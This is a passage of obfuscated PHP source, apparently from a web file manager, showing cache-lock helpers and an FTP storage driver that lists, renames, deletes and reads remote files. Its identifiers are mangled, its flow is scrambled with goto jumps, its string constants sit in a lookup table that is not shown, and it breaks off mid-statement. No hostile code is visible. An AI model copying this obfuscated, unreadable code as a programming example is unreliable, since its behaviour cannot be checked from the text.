$d‰“µ¢Øìô[$AëîÃ¤–­ñ[837]] : 10; $cÖ„¾Ç¥Öƒ = _get($GLOBALS[$AëîÃ¤–­ñ[6]], $AëîÃ¤–­ñ[838]); $a¹ ñ¤É = $d‰“µ¢Øìô[$AëîÃ¤–­ñ[824]] ? $d‰“µ¢Øìô[$AëîÃ¤–­ñ[824]] : $AëîÃ¤–­ñ[203]; goto aé¦¢ØÌ; aé¦¢ØÌ: if ($a¹ ñ¤É == $AëîÃ¤–­ñ[27] && $cÖ„¾Ç¥Öƒ == $AëîÃ¤–­ñ[19]) { $a¹ ñ¤É = $AëîÃ¤–­ñ[203]; } switch ($a¹ ñ¤É) { case $AëîÃ¤–­ñ[827]: self::$handle = new CacheLockRedis(); break; case $AëîÃ¤–­ñ[828]: self::$handle = new CacheLockMemcached(); break; case $AëîÃ¤–­ñ[27]: self::$handle = new CacheLockDatabase(); break; case $AëîÃ¤–­ñ[203]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C‰†‘Ü£ ; aÍ°–Ä†‚: $AëîÃ¤–­ñ =& $_SERVER[œÕÊİğö]; if (self::$handle) { return self::$handle; } $d‰“µ¢Øìô = $GLOBALS[$AëîÃ¤–­ñ[6]][$AëîÃ¤–­ñ[357]]; goto BÀÒš¼„‘¿; C‰†‘Ü£ : } private static function key($aõ‚–òÊ—) { return $_SERVER[œÕÊİğö][839] . Cache::key($aõ‚–òÊ—); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($EôñäÚã«å = '') { self::$errorMsg = $EôñäÚã«å; } public static function lockGlobal($e’¤¨åˆÊˆ, $c§¹ÁËÑƒ) { return self::lock($e’¤¨åˆÊˆ, $c§¹ÁËÑƒ, !0); } public static function lock($bÈ˜»ÕäÆÔ, $BÎ¼–¨Óîª = false, $eî¼è¸í»† = false) { goto aŞ‚ğÏ; aŞ‚ğÏ: $dÄÒíƒ£•ß =& $_SERVER[œÕÊİğö]; $B”İİÍ–ƒ = self::init(); $AÜ„°ø‡Ë = self::key($bÈ˜»ÕäÆÔ); goto f¼ŞÛ¿õÍí; f¼ŞÛ¿õÍí: $BÎ¼–¨Óîª = $BÎ¼–¨Óîª ? $BÎ¼–¨Óîª : self::$timeout; $BÎ„¤°‚ñÒ = $B”İİÍ–ƒ->lock($AÜ„°ø‡Ë, $BÎ¼–¨Óîª); if (!$BÎ„¤°‚ñÒ) { $F¹Ü›à©Ñ = "\154\x6f\143\153\40\x65\162\x72\x6f\x72\x3b\x6b\x65\171\75{$bÈ˜»ÕäÆÔ}\73\164\x69\x6d\145\x3d{$BÎ¼–¨Óîª}\73" . self::$errorMsg . $dÄÒíƒ£•ß[78] . get_caller_msg(); $a¼Ñ×åõê = LNG($dÄÒíƒ£•ß[840]) . "\50{$BÎ¼–¨Óîª}\x73\51\56" . LNG($dÄÒíƒ£•ß[841]); $a¼Ñ×åõê .= $dÄÒíƒ£•ß[842]; if (is_string(self::$errorMsg) && self::$errorMsg) { $a¼Ñ×åõê = $a¼Ñ×åõê . $dÄÒíƒ£•ß[843] . self::$errorMsg; } write_log($F¹Ü›à©Ñ, $dÄÒíƒ£•ß[844]); show_json($a¼Ñ×åõê, !1); } goto cÙ÷‹ùØ¦‰; cÙ÷‹ùØ¦‰: if (!$eî¼è¸í»†) { self::$lockItem[$AÜ„°ø‡Ë] = !0; } return $BÎ„¤°‚ñÒ; goto F«¥ÏôÎé˜; F«¥ÏôÎé˜: } public static function lockGet($a´¡ÜŞ¬) { $B ĞÊÛ‚èß = self::key($a´¡ÜŞ¬); if (self::$lockItem[$B ĞÊÛ‚èß]) { return self::$lockItem[$B ĞÊÛ‚èß]; } return self::init()->lockGet($B ĞÊÛ‚èß); } public static function unlock($Fêä Ò¢) { $EËì©¶§æò = self::key($Fêä Ò¢); self::$lockItem[$EËì©¶§æò] = null; return self::init()->unlock($EËì©¶§æò); } public static function unlockRuntime() { $Fµ›„Ë‚¡À =& $_SERVER[œÕÊİğö]; $FËÉ«’¯´ï = self::init(); $e–ÌŠ¿Š’ = !1; foreach (self::$lockItem as $aÖ°Â ×–ô => $dÊÇ…´îôŞ) { if (!$dÊÇ…´îôŞ) { continue; } $FËÉ«’¯´ï->unlock($aÖ°Â ×–ô); if (!$e–ÌŠ¿Š’) { $e–ÌŠ¿Š’ = !0; write_log($Fµ›„Ë‚¡À[845] . $aÖ°Â ×–ô . $Fµ›„Ë‚¡À[78] . get_caller_msg(), $Fµ›„Ë‚¡À[844]); continue; } write_log($Fµ›„Ë‚¡À[845] . $aÖ°Â ×–ô, $Fµ›„Ë‚¡À[844]); } self::fileUnlockAll(); } public static function fileLock($føŸİÚö¨’) { goto F §Œ˜½µ¸; F §Œ˜½µ¸: $bæ‡¿Ãõ‘¡ =& $_SERVER[œÕÊİğö]; if (!$GLOBALS[$bæ‡¿Ãõ‘¡[846]]) { $GLOBALS[$bæ‡¿Ãõ‘¡[846]] = array(); } $GLOBALS[$bæ‡¿Ãõ‘¡[846]][$føŸİÚö¨’] = !1; goto b­»ßø‡‰‹; D²ä…¬ƒŞÃ: return !1; goto A•÷ “„ç; b­»ßø‡‰‹: $AİöÇŞôòì = fopen(DATA_PATH . $føŸİÚö¨’ . $bæ‡¿Ãõ‘¡[847], $bæ‡¿Ãõ‘¡[848]); if (!$AİöÇŞôòì) { return !1; } $GLOBALS[$bæ‡¿Ãõ‘¡[846]][$føŸİÚö¨’] = $AİöÇŞôòì; goto Cïğ„ïÑ­š; Cïğ„ïÑ­š: if (flock($AİöÇŞôòì, LOCK_EX)) { return !0; } self::unlock($føŸİÚö¨’); show_json($bæ‡¿Ãõ‘¡[849], !1); goto D²ä…¬ƒŞÃ; A•÷ “„ç: } public static function fileUnlock($dª–ïÌ‹™) { $a Á§®‚Ô™ =& $_SERVER[œÕÊİğö]; $B®à–Úã¨ = $GLOBALS[$a Á§®‚Ô™[846]][$dª–ïÌ‹™]; if (!$B®à–Úã¨) { return; } $GLOBALS[$a Á§®‚Ô™[846]][$dª–ïÌ‹™] = !1; flock($B®à–Úã¨, LOCK_UN); fclose($B®à–Úã¨); } public static function fileUnlockAll() { $EŒ‰÷òã =& $_SERVER[œÕÊİğö]; if (!$GLOBALS[$EŒ‰÷òã[846]]) { return; } foreach ($GLOBALS[$EŒ‰÷òã[846]] as $AµÎ‹±ƒ¸ê => $aÛ‚ĞŒÓÖ‘) { if (!$aÛ‚ĞŒÓÖ‘) { continue; } $GLOBALS[$EŒ‰÷òã[846]][$AµÎ‹±ƒ¸ê] = !1; flock($aÛ‚ĞŒÓÖ‘, LOCK_UN); fclose($aÛ‚ĞŒÓÖ‘); } $GLOBALS[$EŒ‰÷òã[846]] = array(); } } goto aº¥ß¢Òö; Aí‰´Íó™: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($B†ŠÕª±) { parent::__construct(); if (count($B†ŠÕª±) > 0) { $this->_init($B†ŠÕª±); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Dà‘åÕ‚¥·) { $Cœá°åÌÙ• =& $_SERVER[œÕÊİğö]; global $config; $this->appCharset = $config[$Cœá°åÌÙ•[1264]]; $this->systemCharset = $config[$Cœá°åÌÙ•[1265]]; if (isset($Dà‘åÕ‚¥·[$Cœá°åÌÙ•[1266]]) && $Dà‘åÕ‚¥·[$Cœá°åÌÙ•[1266]]) { $this->systemCharset = $Dà‘åÕ‚¥·[$Cœá°åÌÙ•[1266]]; } } public function iconvApp($BŠ¬†Ìù¶Ğ) { return $this->iconvTo($BŠ¬†Ìù¶Ğ, $this->systemCharset, $this->appCharset); } public function iconvSystem($F²ÛÙ£ì‰§) { return $this->iconvTo($F²ÛÙ£ì‰§, $this->appCharset, $this->systemCharset); } public function getPathOuter($aµ§ªØ¥³ä) { goto FŠÛŒ£¬; EÒª¸ÈŒ—Ñ: $aµ§ªØ¥³ä = KodIO::clear($aµ§ªØ¥³ä); $aµ§ªØ¥³ä = substr($aµ§ªØ¥³ä, strlen($f¯©¥¥¿¾Ô)); if (empty($this->pathDriver)) { return $aµ§ªØ¥³ä; } goto BğÂ¬Àäíº; FŠÛŒ£¬: $e‘‘ŞÅ‘ŒÔ =& $_SERVER[œÕÊİğö]; $f¯©¥¥¿¾Ô = $this->iconvApp($this->pathBase); $aµ§ªØ¥³ä = $this->iconvApp($aµ§ªØ¥³ä); goto eÒ†±êëãí; eÒ†±êëãí: if (substr($f¯©¥¥¿¾Ô, 0, 2) == $e‘‘ŞÅ‘ŒÔ[1267]) { $f¯©¥¥¿¾Ô = BASIC_PATH . substr($f¯©¥¥¿¾Ô, 2); } if (substr($aµ§ªØ¥³ä, 0, 2) == $e‘‘ŞÅ‘ŒÔ[1267]) { $aµ§ªØ¥³ä = BASIC_PATH . substr($aµ§ªØ¥³ä, 2); } $f¯©¥¥¿¾Ô = KodIO::clear($f¯©¥¥¿¾Ô); goto EÒª¸ÈŒ—Ñ; BğÂ¬Àäíº: return $this->pathDriver . $e‘‘ŞÅ‘ŒÔ[8] . ltrim($aµ§ªØ¥³ä, $e‘‘ŞÅ‘ŒÔ[8]); goto bˆ£´¾ñğŞ; bˆ£´¾ñğŞ: } private function _init($CÄÒÙ¼Æßä = array()) { $cÌ×ÖÄèµ =& $_SERVER[œÕÊİğö]; if (!function_exists($cÌ×ÖÄèµ[1268])) { throw new Exception(LNG($cÌ×ÖÄèµ[1269])); } $this->config = $CÄÒÙ¼Æßä; $this->charsetReset($CÄÒÙ¼Æßä); foreach ($CÄÒÙ¼Æßä as $aˆ†ïÏòäÚ => $BãÍóßïßï) { if (isset($this->{$aˆ†ïÏòäÚ})) { $this->{$aˆ†ïÏòäÚ} = $BãÍóßïßï; } } return $this->_login($CÄÒÙ¼Æßä); } private function _login($f°Êªàí„©) { goto b‹óÂÂ–‡±; D–£îÌ¨÷ª: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $fÚê¶¦Ûé¢ = @ftp_login($this->connect, $this->username, $this->userpass); goto Aë‚‰øá…¸; fìƒíÜÉÔé: $D²Ö…ª¦†Ø = isset($C‚ÌÃí³šÑ[$D»ê‰º·ó´[184]]) && $C‚ÌÃí³šÑ[$D»ê‰º·ó´[184]] == $D»ê‰º·ó´[1270] ? !0 : !1; $this->scheme = $D²Ö…ª¦†Ø ? $D»ê‰º·ó´[1271] : $D»ê‰º·ó´[1272]; $this->port = isset($C‚ÌÃí³šÑ[$D»ê‰º·ó´[186]]) ? $C‚ÌÃí³šÑ[$D»ê‰º·ó´[186]] : 21; goto D–£îÌ¨÷ª; fÒÚíºÇ“È: if (isset($dŸÇŞì²š×[$e–š±®¿])) { foreach ($dŸÇŞì²š×[$e–š±®¿] as $AöæÄ«¯Ï­ => $C«Â‚—÷) { $this->{$AöæÄ«¯Ï­} = $C«Â‚—÷; } return !0; } $C‚ÌÃí³šÑ = parse_url(trim($this->server, $D»ê‰º·ó´[8])); $this->host = $C‚ÌÃí³šÑ[$D»ê‰º·ó´[185]]; goto fìƒíÜÉÔé; Aë‚‰øá…¸: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $c¼Ğõ÷œ = $this->pasv == $D»ê‰º·ó´[97] ? !0 : !1; @ftp_pasv($this->connect, $c¼Ğõ÷œ); goto AÌœï‰’»ø; b‹óÂÂ–‡±: $D»ê‰º·ó´ =& $_SERVER[œÕÊİğö]; static $dŸÇŞì²š× = array(); $e–š±®¿ = md5(json_encode($f°Êªàí„©)); goto fÒÚíºÇ“È; AÌœï‰’»ø: $dŸÇŞì²š×[$e–š±®¿] = array($D»ê‰º·ó´[1273] => $this->connect, $D»ê‰º·ó´[185] => $this->host, $D»ê‰º·ó´[184] => $this->scheme, $D»ê‰º·ó´[186] => $this->port); return $fÚê¶¦Ûé¢; goto DÄí‰Î¯¨í; DÄí‰Î¯¨í: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($bÓƒÛµ³êí, $B×¡Ä¡ÃºË = '', $AâÁôÉ›¯Ÿ = REPEAT_RENAME) { if ($this->setContent($bÓƒÛµ³êí, $B×¡Ä¡ÃºË)) { return $this->getPathOuter($bÓƒÛµ³êí); } return !1; } public function mkdir($C‹¼…Œ¹Œê, $bÌ•·Ü¼Ìé = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C‹¼…Œ¹Œê = $this->iconvSystem($C‹¼…Œ¹Œê); if ($this->_isFolder($C‹¼…Œ¹Œê) || @ftp_mkdir($this->connect, $C‹¼…Œ¹Œê)) { return $this->getPathOuter($C‹¼…Œ¹Œê); } if (!$this->mkdir($this->pathFather($C‹¼…Œ¹Œê))) { return !1; } if ($C‹¼…Œ¹Œê = @ftp_mkdir($this->connect, $C‹¼…Œ¹Œê)) { return $this->getPathOuter($C‹¼…Œ¹Œê); } return !1; } public function copyFile($E‡Ï²á‡£Õ, $e¯»±ï†) { goto BÙ‘†‚†íˆ; E‚—£½Ëßƒ: $this->tempFileRemve($CƒŞ¨ö³°·); return $a™Àñ±ÂÇã; goto fêŸ’‰Öâ…; DÇ¤â‰¶×ï: $fµÁ¼Å—ì = $this->iconvApp($CƒŞ¨ö³°·); $this->download($E‡Ï²á‡£Õ, $fµÁ¼Å—ì); $a™Àñ±ÂÇã = $this->upload($e¯»±ï†, $fµÁ¼Å—ì); goto E‚—£½Ëßƒ; BÙ‘†‚†íˆ: if (!$this->_isconn()) { return !1; } $eªœ½ƒÃÕ± = $this->pathThis($this->iconvSystem($E‡Ï²á‡£Õ)); $CƒŞ¨ö³°· = $this->tempFile($eªœ½ƒÃÕ±); goto DÇ¤â‰¶×ï; fêŸ’‰Öâ…: } public function moveFile($DÃ•İ®’İ, $eÆËÈÒêæ˜) { if (!$this->_isconn()) { return !1; } $DÃ•İ®’İ = $this->iconvSystem($DÃ•İ®’İ); $eÆËÈÒêæ˜ = $this->iconvSystem($eÆËÈÒêæ˜); $c¤Œå¿‘í = @ftp_rename($this->connect, $DÃ•İ®’İ, $eÆËÈÒêæ˜); return $c¤Œå¿‘í ? $this->getPathOuter($eÆËÈÒêæ˜) : !1; } public function delFile($d°´Òî—Ñõ) { if (!$this->_isconn()) { return !1; } $d°´Òî—Ñõ = $this->iconvSystem($d°´Òî—Ñõ); return @ftp_delete($this->connect, $d°´Òî—Ñõ); } public function delFolder($cšÏİ¿…Š–) { goto b˜Ä˜Ëö‰; d÷¶º‘ßƒÌ: $this->fileList($cšÏİ¿…Š–, $Fí•Úì±‚‘, $BÎêÒñ—šé, !0); $this->listItemCache = !0; foreach ($BÎêÒñ—šé as $bŒÀÒŸĞÜÌ) { $b¾•ˆÇ¨“æ = $this->iconvSystem($bŒÀÒŸĞÜÌ[$_SERVER[œÕÊİğö][38]]); $F ¥›„ÑöÕ = @ftp_delete($this->connect, $b¾•ˆÇ¨“æ); if (!$F ¥›„ÑöÕ) { return !1; } } goto a‘¸’Ò—ˆØ; a‘¸’Ò—ˆØ: foreach ($Fí•Úì±‚‘ as $b¾•ˆÇ¨“æ) { $b¾•ˆÇ¨“æ = $this->iconvSystem($b¾•ˆÇ¨“æ); $F ¥›„ÑöÕ = @ftp_rmdir($this->connect, $b¾•ˆÇ¨“æ); if (!$F ¥›„ÑöÕ) { return !1; } } $cšÏİ¿…Š– = $this->iconvSystem($cšÏİ¿…Š–); return @ftp_rmdir($this->connect, $cšÏİ¿…Š–); goto aàìÚï¨; b˜Ä˜Ëö‰: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Fí•Úì±‚‘ = $BÎêÒñ—šé = array(); goto d÷¶º‘ßƒÌ; aàìÚï¨: } public function rename($A–ëâôßö, $FòÂŠ·—Óİ) { goto bË×™Å¶; a´Â‰ÍÓö­: $còîò«ä× = rtrim($Bé’ØÛ‘£, $a¼»Ç±ö¹¸[8]) . $a¼»Ç±ö¹¸[8] . $C™ÂƒÀÃä‹; $Bãê¥ØâÀ¿ = @ftp_rename($this->connect, $A–ëâôßö, $còîò«ä×); $còîò«ä× = $this->iconvApp($còîò«ä×); goto bÔ¿²±Ù÷¼; aÎÅé……êŒ: $C™ÂƒÀÃä‹ = $this->iconvSystem($C™ÂƒÀÃä‹); $A–ëâôßö = $this->iconvSystem($A–ëâôßö); $Bé’ØÛ‘£ = $this->pathFather($A–ëâôßö); goto a´Â‰ÍÓö­; bË×™Å¶: $a¼»Ç±ö¹¸ =& $_SERVER[œÕÊİğö]; if (!$this->_isconn()) { return !1; } $C™ÂƒÀÃä‹ = $this->fileNameAuto($this->pathFather($A–ëâôßö), $FòÂŠ·—Óİ); goto aÎÅé……êŒ; bÔ¿²±Ù÷¼: return $Bãê¥ØâÀ¿ ? $this->getPathOuter($còîò«ä×) : !1; goto fˆ¦²à‚…; fˆ¦²à‚…: } private function folderInfo($E…ëÇ×È¥Ë, $f—ñ‚ŸÜŠ = false) { $c»Ì¾‰š” =& $_SERVER[œÕÊİğö]; $eˆåÉßËõ• = array($c»Ì¾‰š”[38] => $this->pathThis($E…ëÇ×È¥Ë), $c»Ì¾‰š”[86] => $this->getPathOuter($c»Ì¾‰š”[8] . $E…ëÇ×È¥Ë), $c»Ì¾‰š”[39] => $c»Ì¾‰š”[87]); if ($f—ñ‚ŸÜŠ) { return $eˆåÉßËõ•; } $eˆåÉßËõ•[$c»Ì¾‰š”[204]] = $eˆåÉßËõ•[$c»Ì¾‰š”[94]] = 0; $eˆåÉßËõ•[$c»Ì¾‰š”[205]] = $eˆåÉßËõ•[$c»Ì¾‰š”[206]] = !0; return $eˆåÉßËõ•; } private function fileInfo($DØéÇ¯„äŞ, $cï¨âÂíÆµ = false, $D’¦Éˆ§íÉ = array()) { goto dáÜÇ“æÅ; E™Š¨É‘‰Ü: $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[94]] = @ftp_mdtm($this->connect, $E¼“ÀŸ§™Î); if (empty($D’¦Éˆ§íÉ)) { $D’¦Éˆ§íÉ = $this->objectMeta($DØéÇ¯„äŞ); if (!$D’¦Éˆ§íÉ) { return $aå‹›“Ü¨Ô; } } $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[88]] = $D’¦Éˆ§íÉ[$C·îÈïğ‡Ü[88]]; goto f©ôà…¯Óø; dáÜÇ“æÅ: $C·îÈïğ‡Ü =& $_SERVER[œÕÊİğö]; $aå‹›“Ü¨Ô = array($C·îÈïğ‡Ü[38] => $this->pathThis($DØéÇ¯„äŞ), $C·îÈïğ‡Ü[86] => $this->getPathOuter($C·îÈïğ‡Ü[8] . $DØéÇ¯„äŞ), $C·îÈïğ‡Ü[39] => $C·îÈïğ‡Ü[203], $C·îÈïğ‡Ü[88] => isset($D’¦Éˆ§íÉ[$C·îÈïğ‡Ü[88]]) ? $D’¦Éˆ§íÉ[$C·îÈïğ‡Ü[88]] : 0, $C·îÈïğ‡Ü[178] => $this->ext($DØéÇ¯„äŞ)); if ($cï¨âÂíÆµ) { return $aå‹›“Ü¨Ô; } goto eëÁ¸¼Şƒä; eëÁ¸¼Şƒä: $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[204]] = $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[94]] = 0; $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[205]] = $aå‹›“Ü¨Ô[$C·îÈïğ‡Ü[206]] = !0; $E¼“ÀŸ§™Î = $this->iconvSystem($DØéÇ¯„äŞ); goto E™Š¨É‘‰Ü; f©ôà…¯Óø: return $aå‹›“Ü¨Ô; goto eíïôˆ™å; eíïôˆ™å: } public function size($bÔËªÙ‹ÓÏ) { $b÷óñ…ïìÅ = $this->objectMeta($bÔËªÙ‹ÓÏ); return $b÷óñ…ïìÅ ? $b÷óñ…ïìÅ[$_SERVER[œÕÊİğö][88]] : 0; } public function info($d²š…ºµÅğ) { if ($this->isFile($d²š…ºµÅğ)) { return $this->fileInfo($d²š…ºµÅğ, 0); } else { if ($this->isFolder($d²š…ºµÅğ)) { return $this->folderInfo($d²š…ºµÅğ); } } return !1; } private function fileList($F¸ùÍæá, &$e·Ø…İ¤ŸÏ, &$D²ÅÂ©Û‘², $B—ï¢™´†å = false) { goto Aì²äËÒ‚; BœÎÁæ¦ù: $C¬‰›ğ“ñŠ = array($BÔ—¾ƒè«[105] => 1, $BÔ—¾ƒè«[1274] => 1); foreach ($f³Á±½Îîª as $fŒŒºæ»İ) { goto D‚Ò­É‰­Ñ; D‚Ò­É‰­Ñ: $fÎÎ„Ëë¼À = $this->_listItem($fŒŒºæ»İ); if ($fÎÎ„Ëë¼À[0] == $BÔ—¾ƒè«[749]) { continue; } $c ŒÎñ¤®¥ = $fÎÎ„Ëë¼À[8]; goto bÙö İöÛŞ; C–¤èÎ¥Í¿: if ($CªÑÎÒ¾Á) { $e·Ø…İ¤ŸÏ[] = $c ŒÎñ¤®¥; if ($B—ï¢™´†å) { $this->fileList($c ŒÎñ¤®¥, $e·Ø…İ¤ŸÏ, $D²ÅÂ©Û‘², $B—ï¢™´†å); } continue; } $D²ÅÂ©Û‘²[] = $d™‹ì‘ç°º; goto e‚–¤Ó Ì‹; bÙö İöÛŞ: if (empty($c ŒÎñ¤®¥) && $c ŒÎñ¤®¥ !== $BÔ—¾ƒè«[201] || isset($C¬‰›ğ“ñŠ[$c ŒÎñ¤®¥])) { continue; } $c ŒÎñ¤®¥ = $this->iconvApp($F¸ùÍæá . ltrim($c ŒÎñ¤®¥, $BÔ—¾ƒè«[8])); $d™‹ì‘ç°º = array($BÔ—¾ƒè«[38] => $c ŒÎñ¤®¥, $BÔ—¾ƒè«[39] => $BÔ—¾ƒè«[203], $BÔ—¾ƒè«[88] => $fÎÎ„Ëë¼À[4]); goto BˆŞà¤ÑÑ®; BˆŞà¤ÑÑ®: if (substr($fŒŒºæ»İ, 0, 1) == $BÔ—¾ƒè«[1275]) { $d™‹ì‘ç°º[$BÔ—¾ƒè«[39]] = $BÔ—¾ƒè«[87]; $d™‹ì‘ç°º[$BÔ—¾ƒè«[88]] = 0; } $CªÑÎÒ¾Á = $d™‹ì‘ç°º[$BÔ—¾ƒè«[39]] == $BÔ—¾ƒè«[87] ? !0 : !1; if ($B‚Í†‹Ë­“) { $this->cacheMethod($BÔ—¾ƒè«[209], $c ŒÎñ¤®¥, $CªÑÎÒ¾Á); $this->cacheMethod($BÔ—¾ƒè«[210], $c ŒÎñ¤®¥, $d™‹ì‘ç°º); } goto C–¤èÎ¥Í¿; e‚–¤Ó Ì‹: } if ($B‚Í†‹Ë­“) { $this->cacheMethod($BÔ—¾ƒè«[209], $F¸ùÍæá, !0); } goto A‘ƒæÖÖÎä; cƒŞ„î¨Ö: $B‚Í†‹Ë­“ = $this->listItemCache === !1 ? !1 : !0; $f³Á±½Îîª = @ftp_rawlist($this->connect, $F¸ùÍæá); if (!$f³Á±½Îîª) { $f³Á±½Îîª = array(); } goto BœÎÁæ¦ù; Aì²äËÒ‚: $BÔ—¾ƒè« =& $_SERVER[œÕÊİğö]; $F¸ùÍæá = $this->iconvSystem($F¸ùÍæá); if (!$this->isFolder($F¸ùÍæá)) { return !1; } goto BóÂˆ‹™ìÎ; BóÂˆ‹™ìÎ: @ftp_chdir($this->connect, $BÔ—¾ƒè«[8]); $F¸ùÍæá = rtrim($F¸ùÍæá, $BÔ—¾ƒè«[8]) . $BÔ—¾ƒè«[8]; check_abort(); goto cƒŞ„î¨Ö; A‘ƒæÖÖÎä: } private function _listItem($c Ê®¤¾Áî) { if (empty($c Ê®¤¾Áî)) { return array(); } $e¹‹íéã… = preg_split($_SERVER[œÕÊİğö][1276], $c Ê®¤¾Áî); if (count($e¹‹íéã…) <= 9) { return $e¹‹íéã…; } $e¹‹íéã…[8] = trim(substr($c Ê®¤¾Áî, strpos($c Ê®¤¾Áî, $e¹‹íéã…[7]) + strlen($e¹‹íéã…[7]))); return array_splice($e¹‹íéã…, 0, 9); } public function listPath($cì¦‘ìÆÚÍ, $Fˆœ¶Ù˜œÙ = false) { goto aí¹Š¯™°º; BëÂ±ê½Ê˜: return array($F”ï¡á·Ú›[85] => $e¢ŸãŒéõˆ, $F”ï¡á·Ú›[84] => $dÓ”½õàè„); goto cåªê¡ÄÍ; aí¹Š¯™°º: $F”ï¡á·Ú› =& $_SERVER[œÕÊİğö]; if (!$this->_isconn()) { return !1; } $e¢ŸãŒéõˆ = $dÓ”½õàè„ = array(); goto eŠ«à©½íŒ; eŠ«à©½íŒ: $this->fileList($cì¦‘ìÆÚÍ, $e¢ŸãŒéõˆ, $dÓ”½õàè„); foreach ($e¢ŸãŒéõˆ as $b…¤ºà­‰ => $e¹ˆ¤­ÜÑ‰) { $e¢ŸãŒéõˆ[$b…¤ºà­‰] = $this->folderInfo($e¹ˆ¤­ÜÑ‰, $Fˆœ¶Ù˜œÙ); } foreach ($dÓ”½õàè„ as $b…¤ºà­‰ => $e¹ˆ¤­ÜÑ‰) { $dÓ”½õàè„[$b…¤ºà­‰] = $this->fileInfo($e¹ˆ¤­ÜÑ‰[$F”ï¡á·Ú›[38]], $Fˆœ¶Ù˜œÙ, $e¹ˆ¤­ÜÑ‰); } goto BëÂ±ê½Ê˜; cåªê¡ÄÍ: } public function has($C®ø”Øçê, $aë²ÜàöøÏ = false, $CÜô­ô‰¾× = true) { goto d¨“±öÍ„; aøÌÂ—ó®¨: return !1; goto b”™–Âªå; E£ª±²Øš: $this->fileList($C®ø”Øçê, $e¡Ñöİï“Ò, $E´’°Íàß´, $AôÉ¦èŒˆä); if ($aë²ÜàöøÏ) { return array($eã¬¨ë‚ÛŠ[213] => count($E´’°Íàß´), $eã¬¨ë‚ÛŠ[214] => count($e¡Ñöİï“Ò)); } if ($CÜô­ô‰¾×) { if (count($E´’°Íàß´)) { return !0; } } else { if (count($e¡Ñöİï“Ò)) { return !0; } } goto aøÌÂ—ó®¨; d¨“±öÍ„: $eã¬¨ë‚ÛŠ =& $_SERVER[œÕÊİğö]; $e¡Ñöİï“Ò = $E´’°Íàß´ = array(); $AôÉ¦èŒˆä = $aë²ÜàöøÏ ? !0 : !1; goto E£ª±²Øš; b”™–Âªå: } public function listAll($AÎ‰£Ê—˜Œ) { goto Bğ÷†Í¶¬¼; A¬Ï¢øÍ‰Ã: $this->fileList($AÎ‰£Ê—˜Œ, $CÊÂ‡ˆ„‚‹, $DªíŸ—ÏÊƒ, !0); $eÕšÔ¦”İ¾ = array(); foreach ($DªíŸ—ÏÊƒ as $AİÌš·¢ªá) { $eÕšÔ¦”İ¾[$AİÌš·¢ªá[$C¡í’¼ËÎ[38]]] = $AİÌš·¢ªá[$C¡í’¼ËÎ[88]]; } goto A‡ˆæ”¶¶; Bğ÷†Í¶¬¼: $C¡í’¼ËÎ =& $_SERVER[œÕÊİğö]; if (!$this->_isconn()) { return !1; } $CÊÂ‡ˆ„‚‹ = $DªíŸ—ÏÊƒ = array(); goto A¬Ï¢øÍ‰Ã; A‡ˆæ”¶¶: foreach ($CÊÂ‡ˆ„‚‹ as $AİÌš·¢ªá) { if (is_string($AİÌš·¢ªá)) { $eÕšÔ¦”İ¾[$AİÌš·¢ªá] = 0; } } return $this->listAllFiles($AÎ‰£Ê—˜Œ, array_keys($eÕšÔ¦”İ¾), $eÕšÔ¦”İ¾); goto A…öĞøùÜÌ; A…öĞøùÜÌ: } public function getContent($eÅÄçÄÂµƒ) { if (!$this->_isconn()) { return !1; } $eÅÄçÄÂµƒ = $this->iconvSystem($eÅÄçÄÂµƒ); return $this->fileSubstr($eÅÄçÄÂµƒ); } public function setContent($AÓ‰Ñ¢¢íœ, $EÓÏè’à = '') { goto BîÂ®²œíÊ; b‰Æà³Ğó«: file_put_contents($f×Òò† ›, $EÓÏè’à); $Dßİí§ğ·‹ = $this->upload($AÓ‰Ñ¢¢íœ, $this->iconvApp($f×Òò† ›)); $this->tempFileRemve($f×Òò† ›); goto d„ó¥¨Ä˜‡; d„ó¥¨Ä˜‡: return $Dßİí§ğ·‹; goto c† ˜èºÚ; BîÂ®²œíÊ: if (!$this->_isconn()) { return !1; } $B£­ÍÓùî = $this->pathThis($this->iconvSystem($AÓ‰Ñ¢¢íœ)); $f×Òò† › = $this->tempFile($B£­ÍÓùî); goto b‰Æà³Ğó«; c† ˜èºÚ: } public function fileSubstr($FØøê‡³‹Í, $C²õ“º¯ = 0, $C“ÅÙÏ…ö¬ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($FØøê‡³‹Í, $C²õ“º¯, $C“ÅÙÏ…ö¬); } private function ftpRequest($DÚÅÆÍŞ•, $DÑù§®¯Øˆ = 0, $eŞãº™æÂµ = false) { goto DÉŞÈ‡å†”; DÉŞÈ‡å†”: $DÚÅÆÍŞ• = $this->iconvSystem($DÚÅÆÍŞ•); $DÏ’ÏÖãÅÌ = $this->scheme . $this->host . $_SERVER[œÕÊİğö][4] . $this->port; $Bƒ¿„êóÃ• = curl_init(); goto BÔ½ø¯Á¶; Fò×£êŠî: curl_setopt($Bƒ¿„êóÃ•, CURLOPT_RETURNTRANSFER, 1); $CÂ÷ğ¤†Ù = curl_exec($Bƒ¿„êóÃ•); curl_close($Bƒ¿„êóÃ•); goto AÜ°‚éß«•; AÜ°‚éß«•: return $CÂ÷ğ¤†Ù; goto CÀÆ¿·¼Ä; BÔ½ø¯Á¶: curl_setopt($Bƒ¿„êóÃ•, CURLOPT_URL, $DÏ’ÏÖãÅÌ . $this->pathEncode($DÚÅÆÍŞ•)); curl_setopt($Bƒ¿„êóÃ•, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($eŞãº™æÂµ) { $e·µµæåá = $DÑù§®¯Øˆ + 